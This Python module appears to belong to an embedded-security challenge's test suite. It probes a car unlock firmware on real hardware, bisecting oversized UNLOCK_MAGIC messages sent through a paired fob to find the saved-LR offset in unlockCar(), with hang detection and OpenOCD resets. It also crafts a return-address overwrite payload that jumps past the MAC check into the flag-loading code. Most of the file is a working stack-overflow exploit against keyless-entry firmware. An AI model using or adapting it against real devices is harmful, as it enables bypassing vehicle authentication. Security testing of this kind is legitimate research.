"""
Dynamic (real-hardware) discovery/confirmation of unlockCar()'s saved-LR
offset - the reset-only counterpart to overflow_offsets.py's static
disassembly-based derivation. Deliberately never reads crash state off the
target (no debug reads of registers/exception frames): the oracle is purely
"did the car stop responding", and recovery is purely a reset - modeling
what an attacker with reset-pin control but no live SWD read access could
actually do. See test_overflow_derivation.py's module docstring for how this
fits into the overall staged plan (this is Stage 2).

======================================================================
The liveness oracle: why it's cmd_btn_press, and why that means the FOB
gets reset too
======================================================================
This targets a production (test=False) car - it has to, to match the offset
derive_lr_offset_static() derived from a test=False ELF (see
test_overflow_derivation.py's Stage 0 notes on why unlockCar()'s own body
differs under TEST_BUILD). A production car's processHostCommand() is
entirely `#ifdef TEST_BUILD` - every command, including isLocked, falls
through to "unknown command" - so there is no way to query it directly at
all. The only build-agnostic sign of life is the BOARD_UART protocol
handshake itself, so the oracle here is a real, credentialed
proto.cmd_btn_press() on the paired fob after each probe: if the car is
alive, this is a completely ordinary unlock attempt and succeeds; if the car
is hung, the fob's attemptUnlock() blocks waiting for a NONCE_MAGIC reply
that will never come.

That last part matters more than it sounds: uart_readb()/uart_read() on
this target are HAL_UART_Receive(..., HAL_MAX_DELAY) - genuinely unbounded
blocking reads, with no firmware-level timeout. When the car is hung, the
FOB's own firmware - not just this test's host-side read - blocks forever
inside that receive call. cmd_btn_press()'s `timeout` only bounds how long
the *host script* waits for a reply; it does nothing to unwedge the fob's
firmware. So a "car is hung" result from this oracle leaves the fob
genuinely stuck too, not just idle - which is why _recover() below resets
both devices, not just the car. (Resetting the fob doesn't lose its pairing
state: that's in flash, untouched by a plain reset/no-reflash.)

======================================================================
Why _probe() also resets the fob (and only the fob) on the way IN, before
ever checking liveness
======================================================================
cmd_send_board_msg() is fire-and-forget on the fob: it only calls
send_board_message(), never receive_board_message(). But the car doesn't
stay quiet after our raw injection - unlockCar() immediately fires an
unsolicited NONCE_MAGIC back over BOARD_UART after receiving our
UNLOCK_MAGIC, and an unsolicited ACK_MAGIC after our garbage RESPONSE_MAGIC
fails its MAC check. An idle *paired* fob's main loop only reacts to
buttonPressed() (see TestUnlockBufferOverflow's comment on exactly this) -
it never actively drains those replies, so they sit queued in the fob's
UART peripheral. Left there, they're exactly what attemptUnlock()'s own
receive would read first when cmd_btn_press() makes its *fresh* attempt
right after - computing a MAC against a stale leftover nonce instead of the
car's live reply to the new attempt, and failing for a reason that has
nothing to do with whether the car actually hung. This showed up concretely
as even a totally harmless 0-byte probe reporting a "hang".

_reset_fob_only() clears this deterministically regardless of the exact
stale-byte-vs-overrun-error mechanics, by resetting only the fob - never the
car, which would erase the very crash state this whole function exists to
observe.
"""

import time

import protocol as proto
import openocd

from overflow_offsets import MAX_MESSAGE_LEN

POISON = b"\xFF" * 4  # 0xFFFFFFFF - always-execute-never PPB region on Cortex-M
FILLER = b"A"


def _craft_payload(total_len: int, filler: bytes = FILLER, poison: bytes = POISON) -> bytes:
    """total_len bytes: filler, except the last min(4, total_len) bytes are
    poison. See this module's docstring for why poison sits at the end."""
    poison_len = min(len(poison), total_len)
    filler_len = total_len - poison_len
    return filler * filler_len + (poison[len(poison) - poison_len:] if poison_len else b"")


def _craft_rce_payload(lr_slot_offset: int, reentry_addr: int, filler: bytes = FILLER) -> bytes:
    """The real exploit payload (see test_overflow_derivation.py's Stage 4):
    filler up to the saved-LR slot, then reentry_addr itself as its 4
    little-endian bytes - exactly lr_slot_offset + 4 bytes, just enough to
    fully control the saved LR and nothing more. No shellcode, no live SP
    needed: `pop {..., pc}` in unlockCar()'s own compiled epilogue lands
    execution directly at reentry_addr (derive_reentry_addr()'s output),
    re-entering the already-compiled loadFlag()/uart_write() block that the
    MAC check normally guards.

    reentry_addr | 1 sets the Thumb-mode bit: popping a value into PC on a
    Cortex-M takes bit 0 as the new EPSR.T (Thumb state) rather than part of
    the address - every function here is Thumb code, so this bit must be
    set or the CPU takes a usage fault trying to enter ARM state, which
    doesn't exist on this core."""
    return filler * lr_slot_offset + (reentry_addr | 1).to_bytes(4, "little")


def _recover(car, car_probe_serial: str, fob, fob_probe_serial: str, platform: str,
             oracle_timeout: float = 5.0) -> None:
    """Reset-only recovery for BOTH devices after a probe that hung the car
    - see this module's docstring for why the fob needs it too. Leaves both
    input buffers clean so the next command can't read a stray boot-banner
    byte as its own response.

    Verifies recovery actually worked (via the same cmd_btn_press() oracle
    _probe() uses) rather than just trusting OpenOCD's own "reset succeeded"
    report - unlike Stage 1's test_reset_recovers_hung_car (which checks
    this for a TEST_BUILD car via cmd_is_locked()), nothing had confirmed
    reset-recovery actually works for *this* build/oracle combination before
    now. Without this check, a probe that didn't actually recover would
    silently make every later probe look like it hung too, for a reason
    that has nothing to do with what that later probe sent."""
    for dev, serial_no in ((car, car_probe_serial), (fob, fob_probe_serial)):
        rc = openocd.reset(platform, serial_no)
        assert rc == 0, f"OpenOCD reported the reset itself failed mid-search (probe {serial_no})"
    time.sleep(1.0)
    car.serial.reset_input_buffer()
    fob.serial.reset_input_buffer()

    assert proto.cmd_btn_press(fob, timeout=oracle_timeout).success, (
        "Reset reported success but the car+fob pair isn't answering a real unlock attempt "
        "afterward - recovery itself is broken, not (necessarily) whatever the last probe sent"
    )


def _reset_fob_only(fob, fob_probe_serial: str, platform: str) -> None:
    """Reset just the FOB - deliberately NOT the car, which would erase the
    very crash state this probe exists to observe - between injecting the
    raw overflow payload and checking liveness.

    Necessary because cmd_send_board_msg() is fire-and-forget: the car's own
    unsolicited NONCE_MAGIC (sent right after it receives our UNLOCK_MAGIC)
    and ACK_MAGIC (sent after our garbage RESPONSE_MAGIC fails its MAC
    check) replies are never actively received by an idle paired fob - its
    main loop only reacts to buttonPressed() (see TestUnlockBufferOverflow's
    comment on exactly this). Those bytes sit queued in the fob's UART
    peripheral, and would otherwise be exactly what attemptUnlock()'s own
    receive reads first when cmd_btn_press() makes its *fresh* attempt right
    after - computing a MAC against a stale nonce instead of the car's live
    reply, and failing for a reason that has nothing to do with whether the
    car actually hung. A reset clears the peripheral state unconditionally,
    regardless of the exact stale-byte-vs-overrun-error mechanics."""
    rc = openocd.reset(platform, fob_probe_serial)
    assert rc == 0, f"OpenOCD reported the fob-only reset failed mid-probe (probe {fob_probe_serial})"
    time.sleep(1.0)
    fob.serial.reset_input_buffer()


def _probe(car, fob, car_probe_serial: str, fob_probe_serial: str, platform: str,
           total_len: int, filler: bytes = FILLER, poison: bytes = POISON,
           oracle_timeout: float = 5.0) -> bool:
    """Send a crafted UNLOCK_MAGIC of exactly total_len bytes, unblock the
    second receive with a garbage RESPONSE_MAGIC (contents never matter -
    the MAC is never going to match; see TestUnlockBufferOverflow), clear
    the fob's own stale reply backlog (_reset_fob_only - see its docstring),
    then check liveness via a real cmd_btn_press() (see module docstring for
    why that's the only option against a production car, and why a hang
    result means both devices need recovery). Returns True if it hung.

    The 0.15s gap before RESPONSE_MAGIC is deliberately more generous than
    TestUnlockBufferOverflow's 0.05s (test_security.py): unlockCar()'s
    nonce generation loops on ctr_drbg_generate()/getPrngSeed() and can
    reseed from real ADC entropy sampling on real hardware if a draw fails -
    sim's PRNG has no such variance. uart_readb()/uart_read() on this target
    are unbuffered-beyond-hardware HAL_UART_Receive() polling reads (see
    module docstring), so RESPONSE_MAGIC bytes that arrive before the car
    reaches its second receive call can be missed outright rather than
    queued - which looks exactly like a hang, for a reason that has nothing
    to do with what total_len was."""
    proto.cmd_send_board_msg(fob, proto.UNLOCK_MAGIC, _craft_payload(total_len, filler, poison))
    time.sleep(0.15)
    proto.cmd_send_board_msg(fob, proto.RESPONSE_MAGIC, b"\x00" * 8)
    time.sleep(0.2)

    _reset_fob_only(fob, fob_probe_serial, platform)

    hung = not proto.cmd_btn_press(fob, timeout=oracle_timeout).success
    if hung:
        _recover(car, car_probe_serial, fob, fob_probe_serial, platform, oracle_timeout=oracle_timeout)
    return hung


def find_lr_offset_dynamic(car, fob, platform: str, car_probe_serial: str, fob_probe_serial: str,
                            seed_offset: int = None, max_offset: int = None,
                            oracle_timeout: float = 5.0) -> int:
    """Discover (or confirm) unlockCar()'s saved-LR offset using only a
    hang/no-hang oracle and reset-only recovery - no debug reads anywhere.

    If seed_offset is given (e.g. from derive_lr_offset_static()), tries a
    2-probe fast path first: seed_offset itself should NOT hang (message too
    short to reach LR at all) and seed_offset + 4 SHOULD hang (poison fully
    covers it) - both are the "clean" boundaries described in
    overflow_search.py's payload-construction reasoning (see below), so this
    confirmation is exact, not approximate. If either probe disagrees with
    expectations, the guess didn't check out and this falls through to the
    full search below rather than trusting it.

    The full search bisects hang/no-hang over message length in
    [0, max_offset + 4] (default max_offset = MAX_MESSAGE_LEN - 4, i.e. the
    largest offset a uint8_t message_len could ever reach - see
    OverflowOffsets.reachable) and returns boundary - 4.

    Payload construction (why L <= true_offset never hangs and
    L >= true_offset + 4 always does, with a few-byte fuzzy zone in
    between): receive_board_message() writes exactly `message_len` bytes and
    touches nothing past that, so a too-short message leaves the LR slot
    completely untouched (still the original, valid return address) rather
    than overwritten with something that might itself be a bad address; see
    _craft_payload(). Because of the fuzzy zone right at the boundary, the
    unseeded search's return value can land up to ~3 bytes below the true
    offset if a partial overlap happens to also fault (likely, but not
    guaranteed) - callers that need an exact number should prefer the seeded
    path, or treat this one as an estimate to be cross-checked (see
    test_overflow_derivation.py's test_dynamic_search_agrees_with_static_derivation
    for exactly that).
    """
    if max_offset is None:
        max_offset = MAX_MESSAGE_LEN - 4

    def probe(total_len: int) -> bool:
        return _probe(car, fob, car_probe_serial, fob_probe_serial, platform, total_len,
                      oracle_timeout=oracle_timeout)

    if seed_offset is not None:
        assert seed_offset + 4 <= MAX_MESSAGE_LEN, (
            f"seed_offset={seed_offset} isn't reachable via a uint8_t message_len "
            f"(see MAX_MESSAGE_LEN) - nothing to confirm"
        )
        below_hung = probe(seed_offset)
        at_hung = probe(seed_offset + 4)
        if not below_hung and at_hung:
            return seed_offset
        # Seed didn't confirm at either clean boundary - fall through to a
        # full search rather than trusting an unconfirmed guess.

    lo, hi = 0, max_offset + 4
    assert not probe(lo), (
        f"Car hung at length {lo} bytes - that should never reach the LR slot at all, "
        f"so this search's core assumption doesn't hold here"
    )
    assert probe(hi), (
        f"Car never hung even at length {hi} (the largest offset a uint8_t message_len can "
        f"reach) - either it isn't vulnerable this way, or max_offset is wrong"
    )
    while hi - lo > 1:
        mid = (lo + hi) // 2
        if probe(mid):
            hi = mid
        else:
            lo = mid
    return hi - 4
